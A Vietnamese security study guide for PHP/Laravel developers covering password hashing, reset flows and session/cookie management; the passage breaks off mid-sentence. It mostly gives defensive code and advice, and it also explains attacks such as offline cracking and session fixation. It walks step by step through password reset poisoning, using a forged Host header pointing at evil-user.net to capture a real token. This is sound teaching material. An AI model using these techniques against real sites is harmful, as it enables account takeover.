# 10. Bảo mật · Kiến thức

> [← Plan ôn tập](../10-security.md) · [Mục lục kiến thức](README.md)
> Bài đọc tổng hợp từ tài liệu gốc ở mục "Đọc" của từng module. Đọc sau khi đã xem plan; tick các
> tiêu chí "Nắm chắc khi" ở file plan. Mọi nội dung đã qua một lượt review độc lập đối chiếu nguồn gốc.

## Mục lục

- Chặng 1: Nền
  - [1.1 Lưu password](#11-lưu-password)
  - [1.2 Session và cookie](#12-session-và-cookie)
  - [1.3 Injection, XSS, CSRF](#13-injection-xss-csrf)
  - [1.4 Crypto cơ bản](#14-crypto-cơ-bản)
  - [1.5 Authentication, authorization và IDOR](#15-authentication-authorization-và-idor)
- Chặng 2: Làm chủ
  - [2.1 JWT](#21-jwt)
  - [2.2 Vòng đời token: revocation, refresh, nơi lưu, BFF](#22-vòng-đời-token-revocation-refresh-nơi-lưu-bff)
  - [2.3 OAuth 2.0 và OIDC](#23-oauth-20-và-oidc)
  - [2.4 MFA và passkey](#24-mfa-và-passkey)
  - [2.5 Authorization: mô hình và tầng kiểm tra](#25-authorization-mô-hình-và-tầng-kiểm-tra)
  - [2.6 Lỗ hổng web và API theo OWASP](#26-lỗ-hổng-web-và-api-theo-owasp)
  - [2.7 Header bảo mật, CSRF hiện đại, CORS](#27-header-bảo-mật-csrf-hiện-đại-cors)
  - [2.8 Tầng PHP/Laravel](#28-tầng-phplaravel)
  - [2.9 Chống lạm dụng: rate limit, brute force, bot](#29-chống-lạm-dụng-rate-limit-brute-force-bot)
- Chặng 3: Senior
  - [3.1 OAuth nâng cao: token gắn người giữ, PAR, SSO](#31-oauth-nâng-cao-token-gắn-người-giữ-par-sso)
  - [3.2 Multi-tenant isolation](#32-multi-tenant-isolation)
  - [3.3 Crypto ứng dụng và quản lý key](#33-crypto-ứng-dụng-và-quản-lý-key)
  - [3.4 Secret và supply chain](#34-secret-và-supply-chain)
  - [3.5 Dữ liệu cá nhân và pháp lý](#35-dữ-liệu-cá-nhân-và-pháp-lý)
  - [3.6 Nguyên tắc, threat modeling, phát hiện](#36-nguyên-tắc-threat-modeling-phát-hiện)

---

## Chặng 1: Nền

### 1.1 Lưu password

Module này trả lời: vì sao password phải lưu bằng một hàm hash *chậm* chứ không phải SHA-256, salt
và pepper chặn được kịch bản nào, luồng login và quên mật khẩu viết thế nào để không lộ thông tin,
và NIST SP 800-63B-4 hiện yêu cầu gì về password policy.

#### Hash chậm có chủ đích

Hash và encrypt khác nhau ở chỗ có đảo ngược được hay không:

- *Encrypt* là hai chiều: có key thì giải ra bản gốc. Dùng cho dữ liệu cần đọc lại (địa chỉ, số
  điện thoại).
- *Hash* là một chiều: từ output không tính ngược ra input. Lúc login chỉ cần hash lại input rồi so
  với hash đã lưu, không bao giờ cần bản gốc. Vì vậy password luôn được **hash**, không encrypt.
  Ngoại lệ duy nhất OWASP nêu: app buộc phải dùng lại password để đăng nhập vào một hệ thống khác
  không hỗ trợ cách cấp quyền hiện đại. Khi đó nên tìm kiến trúc khác trước.

Kịch bản cần phòng là *offline attack*: kẻ tấn công đã có bản dump bảng `users` (qua SQL injection,
backup để quên trên S3, nhân viên cũ) và thử đoán trên máy của hắn, không bị rate limit, không để lại
log. Hắn không đảo ngược hash, mà làm ba bước lặp đi lặp lại:

1. Chọn một password ứng viên (từ danh sách password đã lộ ở các vụ khác, từ điển, hoặc vét cạn).
2. Hash nó bằng đúng thuật toán và salt của nạn nhân.
3. So với hash trong DB. Khớp là xong.

Tốc độ của bước 2 quyết định tất cả. Ước lượng bậc độ lớn (tuỳ phần cứng, chỉ để hình dung):

| Tình huống | Số lần thử mỗi giây | Vét cạn 36^8 ≈ 2,8 × 10^12 password (8 ký tự chữ thường + số) |
|---|---|---|
| Hash nhanh trên một GPU RTX 4090 (benchmark hashcat 6.2.6): MD5, SHA-1, SHA-256 | MD5 ≈ 1,6 × 10^11; SHA-1 ≈ 5 × 10^10; SHA-256 ≈ 2,2 × 10^10 | khoảng 20 giây (MD5) tới khoảng 2 phút (SHA-256) |
| Giả sử hash chậm chỉ cho 10^4 lần/giây | 10^4 | khoảng 9 năm |

Con số ở dòng hai là giả định để minh hoạ, không phải benchmark. Ý chính: MD5, SHA-1, SHA-256 được
thiết kế để **nhanh**, và "nhanh" đúng là thứ kẻ đoán password cần. Làm chậm mỗi lần hash đi một
triệu lần thì chi phí tấn công cũng tăng một triệu lần, còn user thật chỉ chờ thêm vài trăm ms mỗi
lần login.

Các hàm hash password (OWASP Password Storage Cheat Sheet, theo thứ tự ưu tiên):

| Thuật toán | Đặc điểm | Tham số tối thiểu OWASP khuyến nghị |
|---|---|---|
| argon2id | Thắng Password Hashing Competition 2015. *Memory-hard*: mỗi lần hash cần một lượng RAM lớn, nên GPU (nhiều nhân nhưng ít RAM mỗi nhân) khó chạy song song | m=19456 (19 MiB), t=2, p=1. Các cấu hình tương đương: m=47104/t=1, m=12288/t=3, m=9216/t=4, m=7168/t=5 |
| scrypt | Cũng memory-hard, dùng khi không có argon2id | N=2^17 (128 MiB), r=8, p=1 |
| bcrypt | Lâu đời, có ở mọi nơi. OWASP hiện xếp vào nhóm "cho hệ thống legacy" | work factor từ 10 trở lên, input tối đa 72 byte |
| PBKDF2 | Dùng khi cần chuẩn FIPS-140 (yêu cầu của một số khách hàng chính phủ, ngân hàng) | PBKDF2-HMAC-SHA256 với 600.000 vòng |

(m là RAM theo KiB, t là số vòng, p là số luồng song song.)

*Cost factor* (work factor) là tham số chỉnh độ chậm. Với bcrypt, cost là số mũ: số vòng lặp là
2^cost, nên tăng cost thêm 1 thì thời gian hash gấp đôi. Cách chọn:

- Đo trên server thật. PHP manual gợi ý nhắm dưới khoảng 350 ms cho login tương tác; OWASP chỉ nói
  chung là dưới một giây. Không có con số vàng: cost quá cao thì chính bạn bị DoS (xem nhóm cạm bẫy).
- Tăng dần theo thời gian khi phần cứng mạnh lên.

Trong PHP:

- `password_hash($pw, PASSWORD_DEFAULT)` hiện dùng bcrypt, tự sinh salt. Cost mặc định của bcrypt là
  **12 kể từ PHP 8.4** (trước đó là 10).
- `PASSWORD_ARGON2ID` chỉ có khi PHP được build kèm Argon2.
- `PASSWORD_DEFAULT` được thiết kế để có thể đổi sang thuật toán mạnh hơn ở bản sau, nên cột lưu hash
  nên rộng hơn 60 ký tự (PHP manual gợi ý 255).
- Chuỗi hash tự chứa thuật toán, cost và salt, ví dụ `$2y$12$<22 ký tự salt><31 ký tự hash>` hay
  `$argon2id$v=19$m=...,t=...,p=...$<salt>$<hash>`. Nhờ vậy `password_verify` không cần cột salt
  riêng, và một bảng có thể chứa lẫn hash cũ lẫn hash mới trong lúc chuyển đổi.

*Rehash*: khi đổi cost hoặc thuật toán, bạn không thể hash lại password của mọi user vì không có
password gốc. Cách làm là đợi user đăng nhập thành công lần tới: lúc đó password gốc đang nằm trong
request, `password_needs_rehash` cho biết hash cũ có còn khớp cấu hình hiện tại không, nếu không thì
hash lại và lưu. User không bao giờ đăng nhập lại thì giữ hash cũ mãi; OWASP gợi ý hai hướng cho hash
kiểu MD5 cũ: xoá và bắt reset password với tài khoản lâu không hoạt động, hoặc bọc lớp ngoài
`bcrypt(md5($pw))` rồi thay bằng hash trực tiếp khi user đăng nhập.

Laravel: driver mặc định `bcrypt` với `BCRYPT_ROUNDS` = 12; đổi sang argon2id bằng `HASH_DRIVER`.
`config/hashing.php` có `rehash_on_login => true`, và `SessionGuard::attempt` tự gọi rehash sau khi
login thành công. ⚠️ `Hash::check` mặc định từ chối hash sinh bằng thuật toán khác thuật toán đang
cấu hình (ném `RuntimeException`); khi chuyển từ bcrypt sang argon2id phải đặt `HASH_VERIFY=false`
trong giai đoạn chuyển.

#### Salt và pepper

*Salt* là chuỗi ngẫu nhiên riêng cho từng password, ghép vào trước khi hash và lưu ngay cạnh hash.

- Salt không cần bí mật. Tác dụng của nó không phải giấu gì cả, mà là làm cho mỗi hash trở thành
  một bài toán riêng:
  - Hai user cùng password `123456` có hai hash khác nhau, nên nhìn DB không biết ai trùng password
    với ai.
  - *Rainbow table* (bảng tính sẵn "hash → password" cho hàng tỷ password phổ biến) vô dụng, vì bảng
    tính sẵn không biết trước salt.
  - Kẻ tấn công không thể hash một ứng viên một lần rồi so với cả triệu hash: phải hash lại với salt
    của từng người. Thời gian bẻ tăng tỷ lệ thuận với số user.
- NIST SP 800-63B-4 yêu cầu salt dài ít nhất 32 bit. Thực tế bạn không tự sinh: `password_hash` tự
  sinh salt (từ PHP 8.0 tham số `salt` truyền tay bị bỏ qua).

*Pepper* là một secret **dùng chung** cho mọi password, lưu **ngoài DB** (secret manager, HSM). NIST
gọi đây là một vòng keyed hash bổ sung bằng key chỉ verifier biết, và khuyến nghị (SHOULD) làm.

- Bảo vệ khỏi: kẻ tấn công có DB (SQL injection, backup lộ) nhưng không có pepper. Khi đó mọi hash
  trong DB đều không thể bẻ offline, dù password yếu.
- Không bảo vệ khỏi: kẻ tấn công vào được server app, vì ở đó có cả code, DB credential lẫn pepper.
- Cái giá vận hành: pepper không đổi được mà không có password gốc. Lộ pepper hoặc muốn xoay pepper
  thì phải bắt mọi user reset password (hoặc đợi họ login để hash lại). Mất pepper là mất khả năng
  verify toàn bộ password.

Hai cách áp pepper:

1. *Pre-hash*: trộn pepper vào password trước khi đưa vào hàm hash password.
2. *Post-hash*: hash password như thường, rồi HMAC kết quả với pepper làm key trước khi lưu.

⚠️ Với bcrypt, pre-hash có bẫy. bcrypt gốc coi input là chuỗi kết thúc bằng byte NUL, nên nếu đưa
output nhị phân của SHA-2 vào trực tiếp thì mọi thứ sau byte `0x00` đầu tiên bị bỏ. OWASP khuyến nghị
dạng `bcrypt(base64(hmac-sha384(password, key=pepper)))`: HMAC ra 48 byte, base64 thành 64 ký tự
in được, không có NUL và vẫn dưới 72 byte.

```php
<?php
declare(strict_types=1);

// Pepper đọc từ secret manager / biến môi trường, KHÔNG nằm trong DB
function hashWithPepper(string $password, string $pepper): string
{
    $pre = base64_encode(hash_hmac('sha384', $password, $pepper, true)); // 64 ký tự
    return password_hash($pre, PASSWORD_BCRYPT);
}

function verifyWithPepper(string $password, string $hash, string $pepper): bool
{
    $pre = base64_encode(hash_hmac('sha384', $password, $pepper, true));
    return password_verify($pre, $hash);
}
```

#### Các cạm bẫy khi hash

⚠️ **bcrypt chỉ dùng 72 byte đầu**, phần sau bị cắt âm thầm (PHP manual ghi rõ với
`PASSWORD_BCRYPT`). Hai password dài giống nhau ở 72 byte đầu được coi là một. Chú ý đơn vị là
**byte**, không phải ký tự: tiếng Việt có dấu trong UTF-8 tốn 2 đến 3 byte mỗi ký tự, nên một câu
passphrase tiếng Việt có thể chạm giới hạn chỉ sau vài chục ký tự. NIST lại yêu cầu verifier kiểm
tra **toàn bộ** password, không được cắt. Ba cách xử lý:

- Giới hạn độ dài tối đa 72 byte và báo lỗi rõ ràng (OWASP). Laravel có sẵn option `limit`
  (`BCRYPT_LIMIT`) cho bcrypt hasher: vượt quá thì ném `InvalidArgumentException` thay vì cắt âm thầm.
- Pre-hash bằng HMAC + base64 như đoạn code trên.
- Dùng argon2id, không có giới hạn này.

⚠️ **Hash chậm là mục tiêu DoS** (*Denial of Service*, làm server quá tải). Mỗi request login tốn
hàng trăm ms CPU, nên vài chục request song song là đủ chiếm hết worker. Thêm vào đó một số cài đặt
PBKDF2 xử lý password dài chậm hơn hẳn password ngắn (Django từng dính lỗi này năm 2013). Phòng thủ:

- Giới hạn độ dài tối đa hợp lý ở tầng validation (vài trăm byte là quá đủ; với bcrypt là 72).
- Rate limit endpoint login theo IP và theo tài khoản (module 2.9). NIST yêu cầu giới hạn số lần thất
  bại liên tiếp trên một tài khoản ở mức không quá 100.

*Timing attack* là đoán bí mật bằng cách đo thời gian phản hồi. Có hai dạng hay gặp:

1. So sánh chuỗi. Phép so thông thường (`===`, `strcmp`) dừng ngay ở byte khác đầu tiên, nên đoán
   đúng càng nhiều byte đầu thì phản hồi càng chậm hơn một chút. Lặp đủ nhiều lần là đo được. Token,
   HMAC, API key phải so bằng *constant-time compare*, tức hàm luôn duyệt hết chuỗi bất kể sai ở
   đâu. PHP: `hash_equals($known, $userInput)` (thứ tự tham số: giá trị đúng trước, input sau).
   Password thì dùng `password_verify`, hàm này đã so an toàn bên trong.
2. Lộ email tồn tại. Nếu email không có trong DB, code thường `return false` ngay, mất vài ms; email
   có thật thì phải chạy bcrypt, mất vài trăm ms. Chênh lệch này đủ để dò danh sách email đã đăng ký
   (*user enumeration*). Sửa: khi không tìm thấy user vẫn chạy `password_verify` với một hash giả.

Ví dụ chạy được (`php login_demo.php`, không cần DB), gom cả dummy hash lẫn rehash:

```php
<?php
declare(strict_types=1);

const OPTIONS = ['cost' => 12];

// "DB" giả: hash cũ tạo với cost 10
$users = [
    'an@example.com' => password_hash('correct horse battery staple', PASSWORD_BCRYPT, ['cost' => 10]),
];
// Hash giả dùng khi email không tồn tại, để thời gian phản hồi tương đương
$dummyHash = password_hash('khong-bao-gio-khop', PASSWORD_BCRYPT, OPTIONS);

function login(array &$users, string $dummyHash, string $email, string $password): bool
{
    if (strlen($password) > 72) {            // bcrypt chỉ đọc 72 byte: từ chối thay vì cắt
        return false;
    }
    $hash = $users[$email] ?? null;
    if ($hash === null) {
        password_verify($password, $dummyHash); // tốn thời gian như trường hợp thật
        return false;
    }
    if (!password_verify($password, $hash)) {
        return false;
    }
    if (password_needs_rehash($hash, PASSWORD_BCRYPT, OPTIONS)) {
        $users[$email] = password_hash($password, PASSWORD_BCRYPT, OPTIONS); // đang có password gốc
    }
    return true;
}

var_dump(login($users, $dummyHash, 'khong-co@example.com', 'x'));                 // bool(false)
var_dump(login($users, $dummyHash, 'an@example.com', 'sai'));                      // bool(false)
var_dump(login($users, $dummyHash, 'an@example.com', 'correct horse battery staple')); // bool(true)
echo password_get_info($users['an@example.com'])['options']['cost'], PHP_EOL;       // 12
```

Laravel xử lý dạng thứ hai bằng *timebox*: `SessionGuard::attempt` và `validate` bọc toàn bộ phần tra
user và verify trong `Timebox` với thời lượng mặc định 200.000 micro giây (200 ms); đăng nhập thất bại
luôn bị kéo dài tới ít nhất mốc đó, đăng nhập thành công thì trả về ngay. ⚠️ Nếu bcrypt trên server
của bạn tốn hơn 200 ms thì nhánh "email có thật nhưng sai password" vẫn chậm hơn nhánh "email không
tồn tại", và timebox không che được chênh lệch này. Đo lại khi tăng cost.

#### Password policy theo NIST SP 800-63B-4

Bản 4 (chính thức 07/2025) dùng động từ SHALL (bắt buộc) và SHOULD (khuyến nghị). Các điểm chính của
mục password:

| Quy định | Mức |
|---|---|
| Tối thiểu **15 ký tự** khi password là yếu tố xác thực duy nhất | SHALL |
| Tối thiểu **8 ký tự** khi password chỉ dùng kèm MFA (xác thực nhiều yếu tố, module 2.4) | SHALL |
| Cho phép độ dài tối đa ít nhất 64 ký tự | SHOULD |
| Nhận mọi ký tự ASCII in được, khoảng trắng, và Unicode; nên chuẩn hoá NFC trước khi hash | SHOULD |
| Mỗi Unicode code point tính là một ký tự khi đếm độ dài | SHALL |
| Không áp quy tắc thành phần kiểu "phải có chữ hoa, số, ký tự đặc biệt" | SHALL NOT |
| Không bắt đổi password định kỳ; chỉ bắt đổi khi có bằng chứng đã lộ | SHALL NOT / SHALL |
| So password mới với blocklist (password từng lộ, từ trong từ điển, tên dịch vụ, username) và từ chối kèm lý do | SHALL |
| Không cho lưu gợi ý password, không dùng câu hỏi bí mật | SHALL NOT |
| Cho phép password manager và autofill; nên cho paste | SHALL / SHOULD |
| Kiểm tra toàn bộ password, không cắt bớt | SHALL |

Lý do bỏ quy tắc thành phần và đổi định kỳ: người dùng phản ứng bằng các biến đổi đoán trước được,
`Password1!` rồi `Password2!`, nên độ mạnh thực tế không tăng mà chỉ khó nhớ hơn. Độ dài và blocklist
hiệu quả hơn nhiều.

NIST cũng lưu ý blocklist không cần khổng lồ: nó chống *online attack* (đoán qua form login), vốn đã
bị rate limit, nên chỉ cần đủ lớn để chặn những password kẻ tấn công sẽ thử trước khi chạm giới hạn.

*Kiểm tra password đã lộ bằng Have I Been Pwned (HIBP).* Dịch vụ Pwned Passwords miễn phí, không cần
API key, và dùng mô hình *k-anonymity* để bạn không phải gửi password (hay cả hash của nó) ra ngoài:

1. Tính SHA-1 của password, dạng hex viết hoa, ví dụ `21BD1...`.
2. Gửi **5 ký tự đầu**: `GET https://api.pwnedpasswords.com/range/21BD1`.
3. API trả về mọi hậu tố (35 ký tự còn lại) của các hash bắt đầu bằng tiền tố đó, kèm số lần xuất
   hiện, mỗi dòng dạng `0018A45C4D1DEF81644B54AB7F969B88D65:1`. Tài liệu HIBP ghi "khoảng 800" dòng
   nhưng con số tăng dần theo dữ liệu; các tiền tố thử vào 09/2026 đều trả khoảng 2.000 dòng.
4. Tự so ở phía bạn: hậu tố của password có trong danh sách là password đã lộ.

Có 16^5 = 1.048.576 tiền tố, mọi tiền tố đều trả HTTP 200, nên HIBP chỉ biết bạn hỏi một trong hàng
nghìn hash, không biết cái nào. Header `Add-Padding: true` độn thêm một số dòng giả ngẫu nhiên (dòng
độn có count 0, bỏ đi khi xử lý) để người nghe lén không đoán tiền tố qua kích thước response. ⚠️ Đừng gọi
API theo từng phím gõ ở frontend: chuỗi request liên tiếp lộ dần password; chỉ kiểm tra khi đã nhập
xong.

Laravel có sẵn rule `Password::min(...)->uncompromised()` dùng đúng API này.

```php
<?php
declare(strict_types=1);

// Tự gọi HIBP bằng PHP thuần (cần allow_url_fopen hoặc thay bằng HTTP client)
function isPwned(string $password): bool
{
    $sha1   = strtoupper(sha1($password));
    $prefix = substr($sha1, 0, 5);
    $suffix = substr($sha1, 5);
    $ctx    = stream_context_create(['http' => ['header' => "Add-Padding: true\r\n"]]);
    $body   = file_get_contents("https://api.pwnedpasswords.com/range/{$prefix}", false, $ctx);
    if ($body === false) {
        return false;                        // API lỗi: tuỳ chính sách, fail-open hoặc fail-closed
    }
    foreach (explode("\n", $body) as $line) {
        [$hashSuffix, $count] = array_pad(explode(':', trim($line)), 2, '0');
        if ($hashSuffix === $suffix && (int) $count > 0) {
            return true;
        }
    }
    return false;
}
```

#### Quên mật khẩu

Luồng an toàn dạng *URL token* (OWASP Forgot Password Cheat Sheet):

1. User nhập email. Server luôn trả **cùng một thông báo** ("nếu email tồn tại, chúng tôi đã gửi
   link") và trong **cùng một khoảng thời gian** dù email có tồn tại hay không. Cách giữ thời gian
   đều: đẩy việc gửi mail vào queue, hoặc cho cả hai nhánh chạy cùng một logic.
2. Sinh token bằng CSPRNG (bộ sinh số ngẫu nhiên an toàn cho crypto, module 1.4), đủ dài để không
   vét cạn được, gắn với một user.
3. Chỉ lưu **hash** của token trong DB, gửi token gốc qua email. DB lộ thì token cũng vô dụng.
4. Link dùng HTTPS, token dùng một lần, hết hạn ngắn. Rate limit cả endpoint yêu cầu reset (chống
   spam hộp thư nạn nhân) lẫn endpoint nhận token (chống dò token).
5. Trang đặt lại password gửi `Referrer-Policy: noreferrer` để token trong URL không rò sang site
   khác qua header `Referer`.
6. Đặt password mới theo cùng policy, gửi email báo "password vừa được đổi" (không kèm password).
7. Thu hồi mọi session và refresh token khác của user (hoặc hỏi user có muốn không).
8. Không tự đăng nhập sau khi reset; để user đăng nhập lại theo luồng thường.

Thêm hai điều OWASP nhấn mạnh: không khoá tài khoản khi có người yêu cầu reset (kẻ tấn công biết
email là khoá được người khác), và câu hỏi bí mật không được là cơ chế duy nhất.

⚠️ *Password reset poisoning* (Host header injection), kỹ thuật PortSwigger công bố từ 2013:

1. Code dựng link reset từ header `Host` của request: `https://{Host}/reset?token=...`.
2. Kẻ tấn công gửi yêu cầu quên mật khẩu cho email nạn nhân nhưng sửa `Host: evil-user.net`.
3. Nạn nhân nhận email **thật** từ hệ thống của bạn, chứa token **thật**, nhưng link trỏ về
   `evil-user.net`.
4. Nạn nhân bấm link, hoặc chỉ cần một phần mềm quét link trong email tự mở nó, là token bay về máy
   kẻ tấn công. Hắn dùng token đó trên site thật để đặt password mới.

Sửa: dựng URL từ domain cấu hình cứng, hoặc kiểm tra `Host` theo whitelist. ⚠️ Với Laravel, đặt
`APP_URL` **chưa đủ**: docs ghi rõ trong một web request, Laravel dùng giá trị header `Host` khi sinh
URL tuyệt đối, và mặc định trả lời mọi request bất kể `Host`. Cách chặn là cấu hình Nginx/Apache chỉ
chuyển request có hostname đúng vào app, hoặc bật middleware `TrustHosts`:

```php
// bootstrap/app.php
->withMiddleware(function (Middleware $middleware): void {
    $middleware->trustHosts(at: ['^app\.example\.com$']);   // chuỗi là regex
})
```

Docs của Laravel nhấn mạnh việc này đặc biệt quan trọng khi app có chức năng reset password. Cẩn
thận tương tự với các header proxy như `X-Forwarded-Host`: chỉ tin chúng khi request đến từ proxy của
bạn.

Laravel password broker (`Password::sendResetLink`, `Password::reset`) đã làm sẵn phần lớn luồng:
token sinh ngẫu nhiên và lưu dạng hash trong bảng `password_reset_tokens`, `expire` mặc định 60 phút,
`throttle` 60 giây giữa hai lần yêu cầu. ⚠️ Code mẫu trong docs trả lỗi theo status của broker
(`back()->withErrors(['email' => __($status)])`), nên email không tồn tại sẽ hiện thông báo khác email
có thật. Muốn chống user enumeration thì trả cùng một thông báo cho mọi status trừ lỗi validation.

#### Đối chiếu Java/Go

| | PHP | Java (Spring Security) | Go |
|---|---|---|---|
| Hash | `password_hash` | `BCryptPasswordEncoder`, `Argon2PasswordEncoder` (`PasswordEncoder.encode`) | `golang.org/x/crypto/bcrypt.GenerateFromPassword`, `golang.org/x/crypto/argon2.IDKey` |
| Verify | `password_verify` | `PasswordEncoder.matches` | `bcrypt.CompareHashAndPassword` |
| Rehash | `password_needs_rehash` | `PasswordEncoder.upgradeEncoding` | tự so cost bằng `bcrypt.Cost(hash)` |
| So sánh constant-time | `hash_equals` | `MessageDigest.isEqual` | `crypto/subtle.ConstantTimeCompare` |

Điểm khác đáng nhớ: gói `argon2` của Go chỉ trả về key thô, bạn phải tự sinh salt và tự định dạng
chuỗi lưu trữ (nên theo *PHC string format*, dạng `$argon2id$v=19$m=...`), trong khi PHP và Spring
đóng gói sẵn cả salt lẫn tham số vào chuỗi hash.

**Tóm tắt nhanh**

- Password lưu bằng hash **chậm có chủ đích**: argon2id (OWASP: m=19 MiB, t=2, p=1) > scrypt > bcrypt
  (cost ≥ 10, legacy) > PBKDF2 (FIPS, 600.000 vòng). SHA-256 trần thì một GPU thử được hàng chục tỷ
  lần mỗi giây.
- Salt riêng từng user, không bí mật, chặn rainbow table và buộc bẻ từng hash. Pepper chung, nằm
  ngoài DB: cứu được khi chỉ lộ DB, vô dụng khi lộ server app, và không xoay được nếu không reset
  password.
- Rehash lúc login thành công (`password_needs_rehash`, Laravel `rehash_on_login`). PHP 8.4 nâng cost
  bcrypt mặc định lên 12. bcrypt cắt ở 72 **byte**.
- Chống timing: `hash_equals` cho token, dummy hash (hoặc Laravel Timebox 200 ms) cho email không tồn
  tại.
- NIST 800-63B-4: tối thiểu 15 ký tự (chỉ password) hoặc 8 (kèm MFA), cho tối đa ≥ 64, không quy tắc
  thành phần, không đổi định kỳ, bắt buộc blocklist (HIBP k-anonymity: gửi 5 ký tự đầu SHA-1).
- Reset: token CSPRNG lưu dạng hash, một lần, hết hạn ngắn, thông báo giống nhau. Link dựng từ domain
  tin cậy; Laravel cần `trustHosts` vì `APP_URL` không ngăn được Host header.

**Nguồn**: [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) ·
[Hashcat 6.2.6 benchmark trên RTX 4090 (Chick3nman)](https://gist.github.com/Chick3nman/32e662a5bb63bc4f51b847bb422222fd) ·
[OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html) ·
[NIST SP 800-63B-4: Authenticators](https://pages.nist.gov/800-63-4/sp800-63b/authenticators/) ·
[HIBP API v3: Pwned Passwords](https://haveibeenpwned.com/API/v3#PwnedPasswords) ·
[PortSwigger: Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning) ·
[PHP: password_hash](https://www.php.net/manual/en/function.password-hash.php) ·
[Laravel: Hashing](https://laravel.com/docs/13.x/hashing) ·
[Laravel: Resetting Passwords](https://laravel.com/docs/13.x/passwords) ·
[Laravel: Configuring Trusted Hosts](https://laravel.com/docs/13.x/requests#configuring-trusted-hosts)

---

### 1.2 Session và cookie

Module này trả lời: một session đăng nhập thực sự gồm những gì ở server và ở trình duyệt, từng thuộc
tính trong header `Set-Cookie` làm gì, session fixation xảy ra thế nào, và vì sao `SameSite` (nhất là
"Lax mặc định") không phải là lớp chống CSRF đáng tin.

#### Session là gì

HTTP là giao thức *stateless*: mỗi request độc lập, server không tự nhớ request trước là của ai.
*Session* là cơ chế thêm trạng thái vào đó:

```
Trình duyệt                                  Server
  Cookie: app_session=8f3a...  ───────────►  tra "8f3a..." trong session store (Redis/DB)
                                             → { user_id: 42, csrf: "...", flash: ... }
```

- Server giữ dữ liệu (ai đang đăng nhập, CSRF token, dữ liệu tạm). Trình duyệt chỉ giữ *session id*,
  một chuỗi ngẫu nhiên vô nghĩa dùng làm khoá tra cứu.
- Sau khi đăng nhập, session id **tương đương với credential mạnh nhất** mà app đã dùng để xác thực
  (OWASP): ai cầm session id là người đó, không cần biết password hay mã MFA.

Yêu cầu với session id (OWASP Session Management Cheat Sheet):

- Ít nhất 64 bit entropy, sinh bằng CSPRNG. Với 64 bit, OWASP ước tính kẻ đoán thử 10.000 lần/giây,
  app có 100.000 session đang sống, cần khoảng 585 năm mới trúng một cái. Tự sinh thì dùng tối thiểu
  128 bit. Tốt nhất dùng cơ chế session có sẵn của framework.
- Nội dung vô nghĩa: không nhét user id, email, role vào session id.
- Chỉ nhận session id qua cookie. Nhận thêm qua URL (`?PHPSESSID=...`) là mở cửa cho session fixation
  và làm lộ id qua log, lịch sử trình duyệt, header `Referer`.

Ưu điểm lớn của session phía server so với token tự chứa (JWT, module 2.1):

- Thu hồi tức thì: xoá bản ghi session ở server là user bị đăng xuất ngay ở request tiếp theo.
- Đăng xuất từng thiết bị, liệt kê các phiên đang hoạt động đều dễ.

Cái giá: mỗi request phải tra session store, và khi có nhiều server thì mọi server phải đọc **chung**
một store. Laravel mặc định driver `database`; `file` hỏng ngay khi có hai server sau load balancer
(chi tiết ở [05-php-laravel.md](05-php-laravel.md#session-và-rate-limiting)). Không nên dựa vào
*sticky session* (load balancer luôn đưa một user về cùng một server): server đó chết là user mất
session, tải cũng phân bổ lệch.

Vòng đời và hết hạn (OWASP):

| Loại timeout | Ý nghĩa | Gợi ý của OWASP |
|---|---|---|
| *Idle timeout* | Không có request nào trong khoảng này thì session hết hạn | 2 đến 5 phút cho app giá trị cao, 15 đến 30 phút cho app rủi ro thấp |
| *Absolute timeout* | Session sống tối đa bấy lâu kể từ lúc tạo, dù đang hoạt động | Tuỳ cách dùng; app văn phòng dùng cả ngày: 4 đến 8 giờ |
| *Renewal timeout* | Định kỳ đổi session id giữa phiên, id cũ còn hiệu lực một khoảng ngắn | Bổ sung khi absolute timeout dài |

- Timeout phải được thực thi **ở server**. Đếm giờ ở client thì kẻ tấn công sửa được.
- Idle timeout không giới hạn được kẻ đã chiếm session, vì hắn tự tạo request đều đặn để giữ phiên;
  absolute timeout mới giới hạn được.
- Logout phải huỷ session ở server, không chỉ xoá cookie.
- Response chứa session id nên có `Cache-Control: no-store`. Lúc logout có thể gửi
  `Clear-Site-Data: "cache", "cookies", "storage"` để trình duyệt xoá dữ liệu của origin.

Laravel: `SESSION_LIFETIME` mặc định 120 phút, đây là idle timeout (hết hạn khi không hoạt động
trong 120 phút). `SESSION_EXPIRE_ON_CLOSE=true` thì cookie mất khi đóng trình duyệt. `config/session.php` không
có mục cấu hình absolute timeout; cần thì tự lưu thời điểm đăng nhập vào session và kiểm tra trong một
middleware.

⚠️ OWASP cũng cảnh báo: **không** lưu session id, JWT, refresh token trong `localStorage` hay
`sessionStorage`. Mọi JavaScript chạy trên origin đều đọc được chúng, nên một lỗi XSS là lộ hết. Dùng
cookie `HttpOnly; Secure; SameSite` hoặc mô hình BFF (module 2.2).

#### Session fixation

*Session hijacking* thường là **lấy trộm** session id của nạn nhân. *Session fixation* đi đường ngược
lại: kẻ tấn công **cài sẵn** một session id mà hắn biết vào trình duyệt nạn nhân, rồi đợi nạn nhân
đăng nhập vào chính session đó.

1. Kẻ tấn công mở site, nhận một session id hợp lệ (chưa đăng nhập), ví dụ `abc`.
2. Hắn cài `abc` vào trình duyệt nạn nhân. Các đường thường gặp: một subdomain hắn kiểm soát đặt
   cookie với `Domain=example.com`; app nhận session id từ URL; một lỗi XSS hoặc response splitting.
3. Nạn nhân đăng nhập. Server đánh dấu session `abc` là "đã đăng nhập, user 42" nhưng **giữ nguyên
   id**.
4. Kẻ tấn công gửi request với cookie `abc` và giờ hắn là user 42.

⚠️ Sửa: **đổi session id ngay sau khi đăng nhập**, và sau mọi lần đổi mức quyền (đổi password, lên
admin, xác nhận MFA). Kẻ tấn công vẫn giữ `abc`, nhưng `abc` không còn là session đã đăng nhập.

- PHP thuần: `session_regenerate_id(true)`, tham số `true` xoá file session cũ. PHP manual cảnh báo
  xoá ngay lập tức có thể làm mất session khi mạng chập chờn hoặc có request song song, và gợi ý
  cách đánh dấu thời điểm huỷ cho session cũ thay vì xoá liền.
- PHP thuần còn mặc định ở chế độ *permissive*: `session.use_strict_mode` mặc định là `0`, tức PHP
  chấp nhận cả session id do client tự bịa ra chưa từng được server tạo. PHP manual gọi việc bật
  `session.use_strict_mode=1` là "bắt buộc" cho bảo mật session.
- Laravel: `Auth::login()` (và `Auth::attempt()` khi thành công) tự gọi `regenerate(true)` trên
